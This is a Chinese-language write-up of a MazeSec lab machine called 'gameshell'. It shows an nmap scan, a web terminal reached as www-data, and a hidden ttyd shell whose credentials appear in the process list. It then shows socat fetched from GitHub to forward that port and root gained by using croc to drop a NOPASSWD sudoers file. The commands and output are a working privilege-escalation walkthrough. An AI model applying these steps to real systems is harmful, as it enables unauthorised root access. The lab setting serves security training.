---
title: "gameshell"
date: 2026-09-18 15:07:36
description: "这里的7681端口是一个www-data的shell交互页面，在这里可以进行交互，然后的话这个靶机是一个游戏靶机，emm，可以在这里玩游戏的，我玩了14把说实话额，等玩到14把的时候我才发现我是来打靶机的来着。"
categories:
  - 网络安全
tags:
  - 渗透测试
  - MazeSec
  - gameshell
  - nmap
  - 提权
  - mazesec
  - 靶场writeup
---

扫描：

```bash
#这里端口扫描范围要大一点，不然扫不出信息，默认情况-A只能扫到1000的端口
┌──(root㉿kali)-[/home/kali1]
└─# nmap -A -p 1-10000 192.168.5.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-13 10:18 CST
Nmap scan report for 192.168.5.27 (192.168.5.27)
Host is up (0.00024s latency).
Not shown: 9997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Bash // The Eternal Shell
|_http-server-header: Apache/2.4.62 (Debian)
7681/tcp open  unknown
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     server: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|     content-type: text/html
|     content-length: 729693
|_    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="apple-mobile-web-app-capable" content="yes"><title>ttyd - Terminal</title><link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6L
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7681-TCP:V=7.94SVN%I=7%D=7/13%Time=6A544B1A%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1C6DE,"HTTP/1\.0\x20200\x20OK\r\nserver:\x20ttyd/1\.7\.7-40
SF:e79c7\x20\(libwebsockets/4\.3\.3-unknown\)\r\ncontent-type:\x20text/htm
SF:l\r\ncontent-length:\x20729693\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\
SF:"en\"><head><meta\x20charset=\"UTF-8\"><meta\x20http-equiv=\"X-UA-Compa
SF:tible\"\x20content=\"IE=edge,chrome=1\"><meta\x20name=\"apple-mobile-we
SF:b-app-capable\"\x20content=\"yes\"><title>ttyd\x20-\x20Terminal</title>
SF:<link\x20rel=\"icon\"\x20type=\"image/png\"\x20href=\"data:image/png;ba
SF:se64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQ
SF:BBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/e
SF:HBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8\+IDx
SF:4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUC
SF:BDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgI
SF:j4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJk
SF:Zi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1
SF:wTU09Imh0dHA6L")%r(HTTPOptions,2223E,"HTTP/1\.0\x20200\x20OK\r\nserver:
SF:\x20ttyd/1\.7\.7-40e79c7\x20\(libwebsockets/4\.3\.3-unknown\)\r\nconten
SF:t-type:\x20text/html\r\ncontent-length:\x20729693\r\n\r\n<!DOCTYPE\x20h
SF:tml><html\x20lang=\"en\"><head><meta\x20charset=\"UTF-8\"><meta\x20http
SF:-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge,chrome=1\"><meta\x20nam
SF:e=\"apple-mobile-web-app-capable\"\x20content=\"yes\"><title>ttyd\x20-\
SF:x20Terminal</title><link\x20rel=\"icon\"\x20type=\"image/png\"\x20href=
SF:\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAA
SF:AGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG
SF:9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTe
SF:k5UY3prYzlkIj8\+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1
SF:wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMz
SF:o0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZ
SF:y8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJv
SF:dXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6L");
MAC Address: 08:00:27:D2:A9:3F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<!-- more -->


这里的7681端口是一个www-data的shell交互页面，在这里可以进行交互，然后的话这个靶机是一个游戏靶机，emm，可以在这里玩游戏的，我玩了14把说实话额，等玩到14把的时候我才发现我是来打靶机的来着。

www-data—>eviden

然后我就开始库库找线索，显示去看了一眼/usr/local/bin下面，也确实看到两个应用程序一个是croc一个是ttyd，然后没啥用，我接着找ps -ef看看进程有啥东西没有，发现了一个以eviden用户运行的带shell的端口

```bash
[mission 14] $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
silo:x:1000:1000::/home/silo:/bin/bash
eviden:x:1001:1001::/home/eviden:/bin/bash

[mission 14] $ ps -ef|grep eviden
eviden       365       1  0 Jul12 ?        00:00:00 /usr/local/bin/ttyd -i 127.0.0.1 -p 9876 -c admin:nimda ·-W bash
```

然后我就在想能不能给它映射出来访问，我用了socat

```bash
wget https://github.com/jingjingxyk/build-static-socat/releases/download/v2.5.0/socat-1.8.1.1-linux-x64.tar.xz
tar -xvf *.xz
./socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:127.0.0.1:9867
```

eviden—>root

上来之后其实很简单了就，使用sudo -l查看一下suid的权限你会发现这个用户下有一个croc的免密执行权限，然后你把这个丢给ai大概问一下作用。

croc是一个跨平台、安全且以用的命令行文件传输工具。它的核心作用是让你能够极其简单地在任意两台主机之间（无论是局域网还是跨公网）安全地传输文件、甚至文件夹甚至短文本。

所以这里思路其实就很清晰，我们可以利用这个来更改eviden的权限从而提权

让ai生成一下本地传输的语法

```bash
root@GameShell:~# cat /tmp/eviden 
eviden ALL=(ALL:ALL) NOPASSWD:ALL
```

```bash
#发送端启动本地中转服务
eviden@GameShell:/$ croc relay
[info]  2026/07/13 04:13:56 starting croc relay version v10.2.7
[info]  2026/07/13 04:13:56 starting TCP server on :9009
[info]  2026/07/13 04:13:56 starting TCP server on :9010
[info]  2026/07/13 04:13:56 starting TCP server on :9011
[info]  2026/07/13 04:13:56 starting TCP server on :9012
[info]  2026/07/13 04:13:56 starting TCP server on :9013
#发送端绑定本地中转发送文件
eviden@GameShell:/$ croc --relay "192.168.5.27:9009" send /tmp/eviden 
Sending 'eviden' (34 B)          
Code is: 2506-letter-angel-fresh

On the other computer run:
(For Windows)
    croc --relay 192.168.5.27:9009 2506-letter-angel-fresh
(For Linux/macOS)
    CROC_SECRET="2506-letter-angel-fresh" croc --relay 192.168.5.27:9009 
#接收端通过本地中转接收并将文件放到/etc/sudoers.d/目录下
croc --relay "192.168.5.27:9009" --out /etc/sudoers.d/
```

最后的flag

```bash
root@GameShell:~# cat /home/silo/user.txt 
flag{user-83add0ab24dcdb4f7a201772f1c10789}
root@GameShell:~# cat root.txt 
flag{root-fcf32fac298a31661e06e3d37148a21a}
```

复盘总结:

总的来说这个靶机不算很难，考点其实挺平常的，基本上都是收集信息的能力。不过这个靶机我一开始也没摸到头绪，因为我一开始习惯性用-A参数nmap扫描就够了，所以只发现了一个80端口，而这个靶机核心端口在1000之后了所以要加上-p参数来进行指定端口范围扫描。